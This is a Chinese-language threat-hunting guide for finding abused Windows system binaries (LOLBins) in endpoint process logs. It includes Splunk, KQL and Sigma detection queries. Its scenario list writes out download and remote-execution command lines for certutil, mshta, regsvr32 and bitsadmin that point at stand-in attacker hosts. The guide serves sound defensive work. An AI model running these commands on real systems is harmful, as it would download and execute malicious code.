---
id: hunting-for-lolbins-execution-in-endpoint-logs
name: hunting-for-lolbins-execution-in-endpoint-logs
name_zh: 猎杀·端点日志·LOLBins·执行
description: 通过分析端点进程创建日志，猎杀滥用合法 Windows 系统二进制（LOLBins）的可疑执行模式。
domain: cybersecurity
subdomain: threat-hunting
tags:
- threat-hunting
- lolbins
- living-off-the-land
- endpoint-detection
- process-monitoring
- mitre-t1218
- defense-evasion
version: '1.0'
author: mahipal
license: Apache-2.0
locale: zh-CN
neo_agents:
- forensic
- general_chat
---

# 猎杀端点日志中的 LOLBins 执行

## 使用时机

- 猎杀滥用内置 Windows 二进制的无文件攻击技术
- 威胁情报表明所在行业存在基于 LOLBin 的攻击活动
- 调查 certutil、mshta、rundll32、regsvr32 等可疑使用告警
- 紫队演练中测试防御规避技术检测
- 评估端点对 MITRE ATT&CK T1218 子技术的检测覆盖

## 前置条件

- Sysmon 事件 ID 1（进程创建），完整命令行记录
- Windows 安全事件 ID 4688，已启用命令行审核
- 含父子进程关系的 EDR 遥测
- 用于查询与关联的 SIEM（Splunk、Elastic、Microsoft Sentinel）
- LOLBAS 项目参考（lolbas-project.github.io）以了解已知滥用模式

## 工作流程

1. **构建 LOLBin 监视列表**：从 LOLBAS 汇总高风险二进制，优先：certutil.exe、mshta.exe、rundll32.exe、regsvr32.exe、msbuild.exe、installutil.exe、cmstp.exe、wmic.exe、wscript.exe、cscript.exe、bitsadmin.exe、powershell.exe。
2. **建立正常使用基线**：用 30 天数据刻画各 LOLBin 的命令行参数、父进程与用户上下文。
3. **猎杀异常参数**：检索表明滥用的参数——certutil 含 `-urlcache -decode -encode`、mshta 含 URL/javascript/vbscript、rundll32 从 temp/user 目录加载 DLL、regsvr32 含 `/s /n /u /i:URL`。
4. **分析父子关系**：识别异常父进程派生 LOLBin——如 outlook.exe 派生 mshta.exe、winword.exe 派生 certutil.exe，提示武器化文档投递。
5. **检查非标准路径**：从 %TEMP%、用户配置目录等非标准路径执行的 LOLBin 可能为复制重命名滥用。
6. **与网络活动关联**：将 LOLBin 执行映射到出站连接（Sysmon 事件 ID 3），识别下载 cradle 与 C2 回连。
7. **评分与排序**：结合可疑参数、异常父进程、非标准路径与网络活动对发现分级。

## 关键概念

| 概念 | 说明 |
|---------|-------------|
| T1218 | 系统二进制代理执行 |
| T1218.001 | 编译的 HTML 文件（mshta.exe） |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32（Squiblydoo） |
| T1218.011 | Rundll32 |
| T1127.001 | MSBuild |
| T1197 | BITS 作业（bitsadmin.exe） |
| T1140 | 去混淆/解码文件（certutil.exe） |
| T1059.001 | PowerShell |
| T1059.005 | Visual Basic（wscript/cscript） |
| LOLBAS | Living Off the Land Binaries, Scripts and Libraries 项目 |

## 工具与系统

| 工具 | 用途 |
|------|---------|
| Sysmon | 进程创建、命令行与哈希记录 |
| CrowdStrike Falcon | 含 LOLBin 分析能力的 EDR |
| Microsoft Defender for Endpoint | 内置 LOLBin 滥用检测 |
| Splunk | 基于 SPL 的进程猎杀与异常检测 |
| Elastic Security | 预置 LOLBin 检测规则 |
| LOLBAS 项目 | LOLBin 滥用技术参考库 |
| Sigma 规则 | 社区 LOLBin 滥用检测规则 |

## 检测查询

### Splunk——高风险 LOLBin 执行
```spl
index=sysmon EventCode=1
| where match(Image, "(?i)(certutil|mshta|rundll32|regsvr32|msbuild|installutil|cmstp|bitsadmin)\.exe$")
| eval suspicious=case(
    match(CommandLine, "(?i)certutil.*(-urlcache|-decode|-encode)"), "certutil_download_decode",
    match(CommandLine, "(?i)mshta.*(http|https|javascript|vbscript)"), "mshta_remote_exec",
    match(CommandLine, "(?i)rundll32.*\\\\(temp|appdata|users)"), "rundll32_unusual_dll",
    match(CommandLine, "(?i)regsvr32.*/s.*/n.*/u.*/i:"), "regsvr32_squiblydoo",
    match(CommandLine, "(?i)msbuild.*\\\\(temp|appdata|users)"), "msbuild_unusual_project",
    match(CommandLine, "(?i)bitsadmin.*/transfer"), "bitsadmin_download",
    match(CommandLine, "(?i)cmstp.*/s.*/ni"), "cmstp_uac_bypass",
    1=1, "normal"
)
| where suspicious!="normal"
| table _time Computer User Image CommandLine ParentImage ParentCommandLine suspicious
```

### KQL——Microsoft Sentinel LOLBin 猎杀
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
    "msbuild.exe", "installutil.exe", "cmstp.exe", "bitsadmin.exe")
| where ProcessCommandLine matches regex @"(?i)(urlcache|decode|encode|http://|https://|javascript:|vbscript:|/s\s+/n|/transfer)"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp desc
```

### Sigma 规则——可疑 LOLBin 命令行
```yaml
title: Suspicious LOLBin Execution with Malicious Arguments
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-encode'
    selection_mshta:
        Image|endswith: '\mshta.exe'
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - 'javascript:'
    selection_regsvr32:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains|all:
            - '/s'
            - '/i:'
    condition: 1 of selection_*
level: high
tags:
    - attack.defense_evasion
    - attack.t1218
```

## 常见场景

1. **Certutil 下载 cradle**：`certutil.exe -urlcache -split -f http://malicious.com/payload.exe %TEMP%\payload.exe` 下载恶意软件。
2. **Mshta HTA**：`mshta.exe http://attacker.com/malicious.hta` 执行远程 HTA。
3. **Regsvr32 Squiblydoo**：`regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll` 执行远程 SCT。
4. **Rundll32 DLL 代理**：`rundll32.exe C:\Users\user\AppData\Local\Temp\malicious.dll,EntryPoint`。
5. **MSBuild 内联任务**：`msbuild.exe C:\Temp\malicious.csproj` 执行嵌入 C#。
6. **BITS 传输**：`bitsadmin /transfer job /download /priority high http://attacker.com/malware.exe C:\Temp\update.exe`。
7. **WMIC XSL**：`wmic process list /format:evil.xsl` 从 XSL 执行脚本。

## 输出格式

```
猎杀 ID: TH-LOLBIN-[DATE]-[SEQ]
主机: [主机名]
用户: [账户上下文]
LOLBin: [二进制名]
完整路径: [执行路径]
命令行: [完整参数]
父进程: [父映像与命令行]
检测类别: [download_cradle/proxy_exec/uac_bypass/applocker_bypass]
网络活动: [是/否——若适用则含目标]
风险级别: [严重/高/中/低]
```